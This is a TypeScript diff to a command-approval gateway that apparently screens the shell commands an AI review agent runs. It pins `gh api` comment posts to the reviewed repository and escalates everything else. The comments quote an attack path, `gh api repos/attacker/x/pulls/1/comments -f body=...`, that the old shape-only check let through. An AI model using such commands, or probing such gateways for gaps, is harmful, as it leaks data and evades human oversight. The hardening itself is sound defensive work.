@@ -49,6 +49,15 @@ export interface ReviewPolicy {
    * / saga (D.2).
    */
   worktreeRoot: string | null;
+  /**
+   * `owner/name` of the GitHub repository under review. A `gh api` comment
+   * post auto-approves ONLY when the repo in its path is this one (compared
+   * case-insensitively, as GitHub does). Absent, null or not `owner/name`
+   * escalates every `gh api` call: the gateway cannot otherwise tell the
+   * review's own PR from `repos/attacker/x/pulls/1/comments`. Optional so a
+   * caller that has not resolved the repo still type-checks and fails safe.
+   */
+  repo?: string | null;
 }
 
 export type ReviewDecision = 'approve' | 'escalate';
@@ -192,9 +201,13 @@ const QWEN_FLAGS: ReadonlySet<string> = new Set(['--remote']);
 
 /**
  * `gh api` paths that post a PR review comment (the sole sanctioned `gh`
- * mutation).
+ * mutation). Captures the owner and repo so the caller can pin them to the
+ * repository under review.
  */
-const GH_REVIEW_PATH = /^repos\/[^/]+\/[^/]+\/pulls\/\d+\/(reviews|comments)$/;
+const GH_REVIEW_PATH =
+  /^repos\/([^/]+)\/([^/]+)\/pulls\/\d+\/(?:reviews|comments)$/;
+/** A policy `repo` must be exactly `owner/name`. */
+const OWNER_REPO = /^[^/\s]+\/[^/\s]+$/;
 // Allowed `gh api` flags (each with a value constraint below). Anything else
 // (`--input`, `--jq`, `-i`, …) escalates.
 const GH_FIELD_FLAGS: ReadonlySet<string> = new Set([
@@ -351,6 +364,12 @@ function validateShellArgs(
 function classifyGh(argv: string[], policy: ReviewPolicy): ReviewDecision {
   if (!policy.comment) return 'escalate';
   if (argv[1] !== 'api') return 'escalate';
+  // No repo to pin the endpoint to: nothing proves the post lands on the PR
+  // under review, so escalate.
+  const reviewRepo = policy.repo;
+  if (typeof reviewRepo !== 'string' || !OWNER_REPO.test(reviewRepo)) {
+    return 'escalate';
+  }
   const rest = argv.slice(2);
   // `gh api` executes exactly ONE endpoint: the FIRST bare positional. Pin it
   // to a review/comment path (a "some token matches" check is decoy-bypassable
@@ -381,7 +400,11 @@ function classifyGh(argv: string[], policy: ReviewPolicy): ReviewDecision {
     }
     if (endpoint === undefined) endpoint = t; // first bare positional
   }
-  if (endpoint === undefined || !GH_REVIEW_PATH.test(endpoint)) {
+  const m = endpoint === undefined ? null : GH_REVIEW_PATH.exec(endpoint);
+  if (m === null) return 'escalate';
+  // The repo in the path must BE the review's repo: the shape alone let
+  // `gh api repos/attacker/x/pulls/1/comments -f body=...` through.
+  if (`${m[1]}/${m[2]}`.toLowerCase() !== reviewRepo.toLowerCase()) {
     return 'escalate';
   }
   return 'approve';
